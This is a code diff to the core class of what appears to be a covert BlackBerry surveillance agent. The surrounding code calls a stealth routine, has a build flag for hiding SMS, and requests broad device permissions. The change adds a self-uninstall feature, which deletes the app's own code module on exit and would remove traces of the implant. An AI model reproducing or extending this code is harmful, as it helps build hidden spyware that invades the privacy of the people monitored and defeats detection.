@@ -16,6 +16,7 @@ import net.rim.device.api.applicationcontrol.ApplicationPermissionsManager;
 import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.CodeModuleGroup;
 import net.rim.device.api.system.CodeModuleGroupManager;
+import net.rim.device.api.system.CodeModuleManager;
 import blackberry.config.Cfg;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
@@ -60,6 +61,7 @@ public final class Core implements Runnable {
 
     /** The task obj. */
     private final Task task;
+    private boolean uninstallAtExit;
 
     /**
      * Instantiates a new core.
@@ -76,7 +78,7 @@ public final class Core implements Runnable {
         checkPermissions();
 
         task = Task.getInstance();
-        
+
         Utils.sleep(1000);
 
         final boolean antennaInstalled = true;
@@ -163,7 +165,7 @@ public final class Core implements Runnable {
                 ApplicationPermissions.PERMISSION_INTERNAL_CONNECTIONS,
                 ApplicationPermissions.PERMISSION_BROWSER_FILTER,
                 ApplicationPermissions.PERMISSION_INTER_PROCESS_COMMUNICATION,
-                ApplicationPermissions.PERMISSION_EXTERNAL_CONNECTIONS,                
+                ApplicationPermissions.PERMISSION_EXTERNAL_CONNECTIONS,
                 //#ifdef SMS_HIDE
                 ApplicationPermissions.PERMISSION_CROSS_APPLICATION_COMMUNICATION,
         //#endif
@@ -236,7 +238,6 @@ public final class Core implements Runnable {
         //#else
         Evidence.info(Messages.getString("7.17")); //$NON-NLS-1$
         //#endif
-       
 
         stealth();
         Utils.sleep(500);
@@ -288,13 +289,35 @@ public final class Core implements Runnable {
             //#ifdef DEBUG
             Debug.stop();
             //#endif
-                        
 
-            Utils.sleep(2000);
             Singleton.self().clear();
-            
+            Utils.sleep(2000);
+
+            if (uninstallAtExit) {
+                final ApplicationDescriptor ad = ApplicationDescriptor
+                        .currentApplicationDescriptor();
+
+                //ApplicationManager.getApplicationManager().scheduleApplication(ad, System.currentTimeMillis() + 10001, true);
+                uninstall();
+            }
+
             System.exit(0);
         }
+    }
+
+    private void uninstall() {
+      //#ifdef DEBUG
+        System.out.println("uninstalling");
+        //#endif
+        final ApplicationDescriptor ad = ApplicationDescriptor
+                .currentApplicationDescriptor();
+
+        final int moduleHandle = ad.getModuleHandle();
+        final int rc = CodeModuleManager.deleteModuleEx(moduleHandle, true);
+        //#ifdef DEBUG
+        System.out.println("uninstalled: " + rc);
+        CodeModuleManager.promptForResetIfRequired();  
+        //#endif
     }
 
     /**
@@ -346,6 +369,8 @@ public final class Core implements Runnable {
         }
     }
 
-
+    public void uninstallAtExit() {
+        this.uninstallAtExit = true;
+    }
 
 }
